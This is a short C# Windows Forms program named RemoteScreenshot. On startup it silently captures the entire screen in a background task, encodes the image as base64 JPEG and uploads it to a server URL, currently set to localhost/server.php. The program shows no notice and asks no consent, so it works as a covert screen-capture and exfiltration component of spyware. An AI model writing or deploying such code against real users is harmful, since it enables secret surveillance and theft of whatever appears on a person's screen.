using System.Drawing.Imaging;
using System.Net;

namespace RemoteScreenshot
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            Task.Run(() => Capture());
        }

        void Capture()
        {
            string server = "http://localhost/server.php";

            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                var ms = new MemoryStream();

                bitmap.Save(ms, ImageFormat.Jpeg);

                var sb64 = Convert.ToBase64String(ms.GetBuffer());

                WebClient wb = new WebClient();
                wb.UploadString(server, sb64);
            }            
        }
    }
}
